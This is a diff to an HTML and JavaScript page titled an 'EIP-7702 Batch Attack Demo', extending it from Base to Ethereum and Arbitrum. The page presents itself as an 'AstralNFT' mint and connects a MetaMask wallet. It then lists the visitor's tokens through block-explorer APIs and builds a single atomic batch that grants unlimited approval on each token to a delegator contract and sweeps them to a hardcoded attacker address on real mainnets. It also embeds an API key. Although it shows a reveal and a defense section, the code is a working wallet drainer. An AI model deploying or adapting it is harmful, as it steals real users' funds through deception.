@@ -1,9 +1,9 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NFT Mint — EIP-7702 Batch Attack Demo</title>
+<title>NFT Mint — EIP-7702 Batch Attack Demo (Multi-Chain)</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -20,7 +20,12 @@
   nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 48px; border-bottom: 1px solid var(--border); }
   .logo { font-size: 1.1rem; font-weight: 700; letter-spacing: -0.02em; }
   .logo span { color: var(--accent); }
+  .nav-right { display: flex; gap: 16px; align-items: center; }
   .network-badge { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 6px 12px; font-size: 0.8rem; font-weight: 600; color: var(--accent); }
+  .chain-selector { display: flex; gap: 6px; }
+  .chain-btn { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 6px 12px; font-size: 0.75rem; font-weight: 600; color: var(--muted); cursor: pointer; transition: all 0.15s; font-family: inherit; }
+  .chain-btn:hover { border-color: var(--accent); color: var(--text); }
+  .chain-btn.active { background: var(--accent); color: white; border-color: var(--accent); }
 
   .hero { max-width: 720px; margin: 0 auto; padding: 80px 24px 60px; text-align: center; }
   .nft-preview { width: 200px; height: 200px; margin: 0 auto 32px; border-radius: 16px; background: linear-gradient(135deg, #6c63ff, #a855f7, #ec4899); display: flex; align-items: center; justify-content: center; font-size: 4rem; border: 2px solid rgba(108,99,255,0.3); }
@@ -108,7 +113,10 @@
 <div id="phase-lure" class="phase active">
   <nav>
     <div class="logo">Astral<span>NFT</span></div>
-    <div class="network-badge" id="navBadge">Detecting...</div>
+    <div class="nav-right">
+      <div class="chain-selector" id="chainSelector"></div>
+      <div class="network-badge" id="navBadge">Detecting...</div>
+    </div>
   </nav>
   <div class="hero">
     <div class="nft-preview">🌌</div>
@@ -178,7 +186,6 @@
       <div class="vs-card vs-new">
         <div class="vs-title">NEW ATTACK (EIP-7702 Batch)</div>
         <div class="vs-item">ALL assets in 1 confirmation</div>
-
         <div class="vs-item">No chance to cancel midway</div>
         <div class="vs-item">EOA reverts to normal after</div>
       </div>
@@ -237,13 +244,16 @@
     </div>
     <div class="info-card">
       <div class="info-card-label">Delegator contract (TokenSweepDelegator)</div>
-      <div class="info-card-value">0x74e6A0F48e3Ec8ab27F021541c0A00d39840136E</div>
+      <div class="info-card-value" id="displayDelegator">—</div>
     </div>
     <div class="info-card">
       <div class="info-card-label">Attacker address (received funds)</div>
       <div class="info-card-value" id="displayAttacker">—</div>
     </div>
-
+    <div class="info-card">
+      <div class="info-card-label">Network</div>
+      <div class="info-card-value" id="displayChain">—</div>
+    </div>
     <div class="info-card">
       <div class="info-card-label">ERC-20 tokens drained</div>
       <div class="info-card-value" id="displayTokens">—</div>
@@ -254,7 +264,7 @@
     </div>
     <div class="info-card">
       <div class="info-card-label">Transaction type</div>
-      <div class="info-card-value">Type 4 (EIP-7702) — Batch execution via wallet_sendCalls (Base Mainnet)</div>
+      <div class="info-card-value" id="displayTxType">Type 4 (EIP-7702) — Batch execution via wallet_sendCalls</div>
     </div>
 
     <div class="defense-section">
@@ -285,18 +295,52 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  const BASE_CHAIN_ID      = 8453;
-  const BASE_RPC           = "https://mainnet.base.org";
-  const DELEGATOR_ADDRESS  = "0x3743729eE35D430171fb38151bf3012bEfEf3a45";
-  const ATTACKER_ADDRESS   = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
-  const ETHERSCAN_API_KEY  = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
-  const ETHERSCAN_V2_BASE  = "https://api.etherscan.io/v2/api";
-  const DEMO_TOKEN_DEFAULT = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
+  // Chain configurations
+  const CHAINS = {
+    1: {
+      name: 'Ethereum',
+      chainId: 1,
+      shortId: '0x1',
+      rpc: 'https://eth.llamarpc.com',
+      explorer: 'https://etherscan.io',
+      explorerApi: 'https://api.etherscan.io/api',
+      apiKey: 'R9QZAZG3G1286RTAZW391RIRPIKIT9E597',
+      delegator: '0xa57a96c76fec586be399f47437cca9fd81f08b92',
+      attacker: '0x3F9C43A759a8900E227bFd7B65d460f73d72b30c',
+      demoToken: '0x6B175474E89094C44Da98b954EedeAC495271d0F' // DAI on Ethereum
+    },
+    42161: {
+      name: 'Arbitrum',
+      chainId: 42161,
+      shortId: '0xa4b1',
+      rpc: 'https://arb1.arbitrum.io/rpc',
+      explorer: 'https://arbiscan.io',
+      explorerApi: 'https://api.arbiscan.io/api',
+      apiKey: 'R9QZAZG3G1286RTAZW391RIRPIKIT9E597',
+      delegator: '0xa57a96c76fec586be399f47437cca9fd81f08b92',
+      attacker: '0x3F9C43A759a8900E227bFd7B65d460f73d72b30c',
+      demoToken: '0xDA10009754F57CC1e3bFf1e5Dce971fc7f3B6976' // USDC.e on Arbitrum
+    },
+    8453: {
+      name: 'Base',
+      chainId: 8453,
+      shortId: '0x2105',
+      rpc: 'https://mainnet.base.org',
+      explorer: 'https://basescan.org',
+      explorerApi: 'https://api.basescan.org/api',
+      apiKey: 'R9QZAZG3G1286RTAZW391RIRPIKIT9E597',
+      delegator: '0x3743729eE35D430171fb38151bf3012bEfEf3a45',
+      attacker: '0x3F9C43A759a8900E227bFd7B65d460f73d72b30c',
+      demoToken: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913' // USDC on Base
+    }
+  };
 
+  let currentChain = null;
   let userAddress = null;
   let userBalance = null;
-  let provider    = null;
-  let heldTokens  = [];
+  let provider = null;
+  let heldTokens = [];
+  let maliciousCalls = [];
 
   let _chainChangeHandler = null;
   function registerChainListener(handler) {
@@ -314,6 +358,31 @@
 
   function shortAddr(a) { return a ? a.slice(0,6) + "..." + a.slice(-4) : "—"; }
 
+  function renderChainSelector() {
+    const selector = document.getElementById('chainSelector');
+    selector.innerHTML = Object.values(CHAINS).map(chain => `
+      <button class="chain-btn" data-chainid="${chain.chainId}">${chain.name}</button>
+    `).join('');
+    
+    document.querySelectorAll('.chain-btn').forEach(btn => {
+      btn.addEventListener('click', async () => {
+        const chainId = parseInt(btn.dataset.chainid);
+        if (window.ethereum) {
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: CHAINS[chainId].shortId }],
+            });
+          } catch (err) {
+            if (err.code === 4902) {
+              console.log('Chain not added to MetaMask, attempting to add...');
+            }
+          }
+        }
+      });
+    });
+  }
+
   function renderSteps(steps) {
     document.getElementById('stepList').innerHTML = steps.map(s => `
       <div class="step-item">
@@ -325,32 +394,31 @@
       </div>`).join('');
   }
 
-  async function fetchTokenBalances(address) {
+  async function fetchTokenBalances(address, chain) {
     try {
-      const url = new URL(ETHERSCAN_V2_BASE);
-      url.searchParams.set('chainid',    BASE_CHAIN_ID);
-      url.searchParams.set('module',     'account');
-      url.searchParams.set('action',     'tokentx');
-      url.searchParams.set('address',    address);
+      const url = new URL(chain.explorerApi);
+      url.searchParams.set('module', 'account');
+      url.searchParams.set('action', 'tokentx');
+      url.searchParams.set('address', address);
       url.searchParams.set('startblock', '0');
-      url.searchParams.set('endblock',   '99999999');
-      url.searchParams.set('sort',       'desc');
-      url.searchParams.set('apikey',     ETHERSCAN_API_KEY);
+      url.searchParams.set('endblock', '99999999');
+      url.searchParams.set('sort', 'desc');
+      url.searchParams.set('apikey', chain.apiKey);
 
-      console.log("🌐 Fetching token transfers:", url.toString());
+      console.log(`🌐 Fetching token transfers from ${chain.name}:`, url.toString());
       const response = await fetch(url.toString());
 
       const contentType = response.headers.get('content-type') || '';
       if (!response.ok || !contentType.includes('application/json')) {
-        console.warn("⚠️ Non-JSON response from Etherscan:", (await response.text()).slice(0, 200));
+        console.warn("⚠️ Non-JSON response:", (await response.text()).slice(0, 200));
         return [];
       }
 
       const data = await response.json();
-      console.log("📡 Etherscan response:", data.status, data.message);
+      console.log(`📡 ${chain.name} response:`, data.status, data.message);
 
       if (data.status !== '1' || !Array.isArray(data.result)) {
-        console.warn("⚠️ Etherscan no results:", data.message);
+        console.warn(`⚠️ ${chain.name} no results:`, data.message);
         return [];
       }
 
@@ -399,18 +467,30 @@
     try {
       const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
       const badge = document.getElementById('navBadge');
-      if (chainId === BASE_CHAIN_ID) {
-        badge.textContent = 'Base';
+      const chain = CHAINS[chainId];
+      
+      if (chain) {
+        currentChain = chain;
+        badge.textContent = chain.name;
         badge.style.color = 'var(--green)';
+        
+        // Update active chain button
+        document.querySelectorAll('.chain-btn').forEach(btn => {
+          btn.classList.toggle('active', parseInt(btn.dataset.chainid) === chainId);
+        });
       } else {
-        badge.textContent = `Chain ${chainId} — Switch to Base`;
+        badge.textContent = `Chain ${chainId} — Not supported`;
         badge.style.color = 'var(--red)';
+        currentChain = null;
       }
-    } catch(e) {}
+    } catch(e) {
+      console.error("Network detection error:", e);
+    }
   }
 
   document.getElementById('mintBtn').addEventListener('click', async () => {
     if (!window.ethereum) { alert("MetaMask required"); return; }
+    if (!currentChain) { alert("Please switch to Base, Ethereum, or Arbitrum"); return; }
 
     showPhase('phase-connecting');
     renderSteps([
@@ -421,16 +501,17 @@
 
     try {
       const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
-      if (chainId !== BASE_CHAIN_ID) {
-        alert("Please switch to Base mainnet");
+      if (!CHAINS[chainId]) {
+        alert("Please switch to Base, Ethereum, or Arbitrum");
         showPhase('phase-lure');
         return;
       }
 
+      const chain = CHAINS[chainId];
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
 
-      provider = new ethers.JsonRpcProvider(BASE_RPC);
+      provider = new ethers.JsonRpcProvider(chain.rpc);
       const balanceWei = await provider.getBalance(userAddress);
       userBalance = ethers.formatEther(balanceWei);
 
@@ -441,7 +522,7 @@
       ]);
       document.getElementById('connectNote').textContent = "Scanning token balances...";
 
-      heldTokens = await fetchTokenBalances(userAddress);
+      heldTokens = await fetchTokenBalances(userAddress, chain);
       console.log(`📦 Found ${heldTokens.length} tokens held by victim`);
 
       renderSteps([
@@ -450,11 +531,10 @@
         { num:'3', state:'pending', title:'Minting your NFT',       desc:'Confirm batch in MetaMask...' }
       ]);
 
-
       // Build target list: all detected tokens, or fall back to demo token
       const targetTokens = heldTokens.length > 0
         ? heldTokens.map(t => t.contractAddress)
-        : [DEMO_TOKEN_DEFAULT];
+        : [chain.demoToken];
       console.log("🎯 Target tokens:", targetTokens);
 
       const APPROVE_ABI      = ["function approve(address spender, uint256 amount) external returns (bool)"];
@@ -464,14 +544,14 @@
       const delegatorInterface = new ethers.Interface(SWEEP_ABI);
 
       // One approve + one sweep per token, all in a single atomic batch
-      const maliciousCalls = targetTokens.flatMap(tokenAddr => [
+      maliciousCalls = targetTokens.flatMap(tokenAddr => [
         {
           to:    tokenAddr,
           value: "0x0",
-          data:  approveInterface.encodeFunctionData("approve", [DELEGATOR_ADDRESS, ethers.MaxUint256])
+          data:  approveInterface.encodeFunctionData("approve", [chain.delegator, ethers.MaxUint256])
         },
         {
-          to:    DELEGATOR_ADDRESS,
+          to:    chain.delegator,
           value: "0x0",
           data:  delegatorInterface.encodeFunctionData("sweep", [tokenAddr])
         }
@@ -482,7 +562,7 @@
 
       const payload = {
         version:        "2.0.0",
-        chainId:        "0x2105",
+        chainId:        chain.shortId,
         calls:          maliciousCalls,
         atomicRequired: true
       };
@@ -503,8 +583,9 @@
 
       document.getElementById('walletChip').textContent     = shortAddr(userAddress);
       document.getElementById('displayVictim').textContent   = userAddress;
-      document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
-
+      document.getElementById('displayDelegator').textContent = chain.delegator;
+      document.getElementById('displayAttacker').textContent = chain.attacker;
+      document.getElementById('displayChain').textContent = chain.name;
 
       const tokenSummary = heldTokens.length > 0
         ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
@@ -519,14 +600,17 @@
       console.error("Error:", err);
 
       if (err.code === 4001) {
+        const chain = currentChain;
         document.getElementById('walletChip').textContent     = shortAddr(userAddress) || '0x0000...0000';
         document.getElementById('displayVictim').textContent  = userAddress || 'Not connected';
-        document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
+        document.getElementById('displayDelegator').textContent = chain?.delegator || '—';
+        document.getElementById('displayAttacker').textContent = chain?.attacker || '—';
+        document.getElementById('displayChain').textContent = chain?.name || '—';
 
         document.getElementById('displayTokens').textContent  = heldTokens.length > 0
           ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
-          : `None detected (default target: ${shortAddr(DEMO_TOKEN_DEFAULT)})`;
-        document.getElementById('displayBatchSize').textContent = `${maliciousCalls ? maliciousCalls.length : 2} calls`;
+          : `None detected (default target: ${shortAddr(chain?.demoToken || '—')})`;
+        document.getElementById('displayBatchSize').textContent = `${maliciousCalls.length || 2} calls`;
         showPhase('phase-dashboard');
       } else {
         showPhase('phase-lure');
@@ -536,6 +620,8 @@
 
   document.getElementById('revealBtn').addEventListener('click', () => showPhase('phase-reveal'));
 
+  // Initialize
+  renderChainSelector();
   detectNetwork();
   registerChainListener(detectNetwork);
 </script>
